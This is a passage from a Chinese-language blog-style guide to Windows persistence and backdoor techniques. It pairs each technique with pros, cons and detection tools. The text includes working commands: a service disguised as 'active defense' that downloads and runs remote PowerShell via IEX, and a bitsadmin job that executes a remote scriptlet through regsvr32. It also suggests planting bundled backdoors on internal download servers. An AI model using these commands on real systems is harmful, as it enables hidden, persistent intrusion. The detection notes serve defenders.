        sc create [ServerName] binPath= BinaryPathName
    例如创建一个名为主动防御的服务。
    sc create "主动防御" binpath= "cmd /c start powershell.exe IEX (new-object net.webclient).downloadstring('http://ip/a')"
    设置为自动运行
    sc config "主动防御" start= auto
    删除服务
    sc delete "主动防御"
  * 优点：重启权限维持
  * 缺点：一般杀软会拦截
  * 排查：工具autoruns
### waitfor.exe
  * 不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe  
[详细参考](https://github.com/3gstudent/Waitfor-Persistence)
  * 优点：远程主动激活
  * 缺点：有waitfor进程
  * 排查：通过Process Explorer工具查看是否有waitfor.exe进程，并进一步查看启动参数等。
### bitsadmin后门
  * Bitsadmin从win7之后操作系统就默认包含，可以用来创建上传或者下载任务。Bistadmin可以指定下载成功之后要进行什么命令。后门就是利用的下载成功之后进行命令执行。
    #创建一个下载任务：
    bitsadmin /create backdoor
    #添加文档：
    bitsadmin /addfile backdoor %comspec%  %temp%\cmd.exe
    #设置下载成功之后要执行的命令：
    bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"
    #执行任务：
    bitsadmin /Resume backdoor
  * 可以参考这篇文章  
[bitsadmin-backdoor-权限维持后门](https://paper.tuisec.win/detail/77720db7618e92c)
  * 优点：系统自带无需上传
  * 缺点：免杀效果一般
  * 排查：bitsadmin /list /verbose
### WMI后门(重点!)
  * 在2015年的blackhat大会上Matt Graeber介绍了一种无文件后门就是用的wmi。[更多可以参考](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf)
  * 在empire中有相应的module，作者参考使用了[Powersploit](https://github.com/PowerShellMafia/PowerSploit/blob/9e771d15bf19ab3c2ac196393c088ecdab6c9a73/Persistence/Persistence.psm1)里面的代码。  
  * 后门在系统重启五分钟之内触发且是system权限。
  * 优点：无文件，相对来说难以排查
  * 缺点：暂无
  * 排查：工具autoruns
### COM劫持
  * 什么是COM，说白了，就是一堆功能相关的interface，它是某种语言向另一种语言暴露功能的最大单位。  
COMcomponent（COM组件）是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。  
由此带来的好处是多方面的：可以将系统中的组件用新的替换掉，以便随时进行系统的升级和定制；可以在多个应用系统中重复利用同一个组件；可以方便的将应用系统扩展到网络环境下；COM与语言，平台无关的特性使所有的程序员均可充分发挥自己的才智与专长编写组件模块。  
* COM的最核心的思想，说白了就是要做个跨语言的 “class” “object” “function” 。COM劫持，从根本上来说，就是在程序读取注册表信息中的DLL或者EXE功能的路径上，做一个拦截，让程序提前读取我们的设置好的恶意DLL或者EXE。原理其实和DLL劫持差不多。
  * 可以参考文章[COM组件劫持原理与实践](http://sh1yan.top/2019/06/29/Principle-and-Practice-of-COM-Component-Hijacking/)[打开文件夹就运行？COM劫持利用新姿势](https://www.freebuf.com/articles/system/115241.html)
  * [利用CLR实现一种无需管理员权限的后门](https://www.4hou.com/technology/6863.html) "主动型"后门，WMI添加环境变量需要重启系统生效
  * 优点:隐藏性较好,autoruns查不到
  * 缺点:暂无
  * 排查:检查环境变量和注册表键值  
### meterpreter 权限维持
  * meterpreter中的权限维持技术有两种，一种是metsvc的后门(服务后门)，另外一种是persistence(注册表后门) 
  * metsvc 是开机自启动的服务型后门  
[metsvc代码](https://github.com/rapid7/metasploit-framework/blob/76954957c740525cff2db5a60bcf936b4ee06c42/scripts/meterpreter/metsvc.rb)
  * persistence模块是先上传vbs脚本并执行vbs脚本修改注册表HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run从而完成自启动。  
[persistence代码](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/persistence_exe.rb)
  * 优点：开机自启动
  * 缺点：容易被杀软杀
  * 排查：像是这种后门使用autoruns基本都可以排查出来。
### Empire persistence模块(重点!!)
  * Empire是一款功能非常强大的后渗透攻击框架。其中的persistence模块提供了一系列权限维持方法。
  * 工具还把权限维持分为了四大类，userland(普通权限)、elevated(需要高权限)、powerbreach(内存权限维持，重启后失效)、miscellaneous(其它)。  
  * 通过info命令查看使用方法  
[更多可以参考文章](https://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/)
  * 优点:基本集成了大部分的权限维持方法
  * 缺点：暂无
  * 排查：工具autoruns
### 进程注入(重点!!)
  * 准确来说进程注入不是后门技术或者权限维持技术，而是一种隐藏技术，这里简单说一下empire的psinject、cobaltstrike的inject和meterpreter中的migrate进程注入，一般可以注入到像是lsass或者explorer这样的进程当中，相对比较隐蔽，较难排查。
  * 使用方法这里就不介绍了，主要说一下如何hunting。这篇文章[TALES OF A BLUE TEAMER: DETECTING POWERSHELL EMPIRE SHENANIGANS WITH SYSINTERNALS](https://holdmybeersecurity.com/2019/02/27/sysinternals-for-windows-incident-response/)里面介绍了如何hunting empire方法，empire有一些evasion detection机制，其中的网络连接时间设置能有效避开常见主机流量检测工具(包括netstat、tcpview)的检测，文章中也介绍了使用process monitor是最快也是最有效的方法。  
  * 但是在hunting 进程注入的时候，并没有像文章中说的查找到以起始地址为0x0的线程，但会发现被注入的进程属性里会有.NET Assemblies和.NET Performance两个菜单。如下图所示  
  * 优点：较难排查
  * 缺点：暂无
  * 排查：工具process explorer 、process monitor
### 捆绑后门
  * 捆绑的意思就是恶意程序以一个正常的程序（可以是程序也可以是文件如doc、pdf、jpg等）为载体，当这个“程序”执行的时候恶意程序即可运行。用于捆绑钓鱼的工具有很多，像是BDF应该是比较早的一款工具，但现在好像不怎么免杀了，前段时间看过现在都在用NimFileBinder这个工具进行捆绑，且免杀一些常见杀软，这个主要是利用了Nim这个小众语言做的（类似go，一些小众语言有时能做到很好的免杀）。
  * 参考 [利用BDF向EXE文件植入后门](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91EXE%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/)  
[Kali Linux: Backdoor-factory
tool](http://2001586161veronika.blog.binusian.org/2018/05/30/backdoor-factory/)  
[NimFileBinder：钓鱼攻击载荷捆绑利器](https://m.freebuf.com/sectool/290302.html)
  * 当拿到内网权限之后，可以在存放公共下载的服务器上给某个软件加上这样的后门。
### IIS模块后门
[手把手带你开发一款 IIS 模块后门](https://forum.90sec.com/t/topic/415)
### 域环境后门
  * [域内配置ACL后门及检测清理](https://www.freebuf.com/articles/system/189942.html?utm_source=tuicool&utm_medium=referral)
  * [PasswordchangeNotify](https://github.com/kevien/PasswordchangeNotify)
  * [域后门相关文章](https://www.anquanke.com/member/127729)
# other
  * 除了以上的几种后门和权限维持技术外还有像是dll劫持、一些软件的插件后门、office后门等。
  * 抛砖引玉，更多windows backdoor方面最新文章可以关注国外安全研究员Casey Smith@subTee和Adam@Hexacorn。
  * 附上本人博客地址，欢迎一起交流学习:> 
# Reference
[Intranet_Penetration_Tips](https://github.com/Ridter/Intranet_Penetration_Tips)  
[Nothing Lasts Forever: Persistence with
Empire](https://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/)  
[EDR检测持久化Persistence入门](https://www.secrss.com/articles/8419)  
[smbbackdoor](https://github.com/zerosum0x0/smbdoor)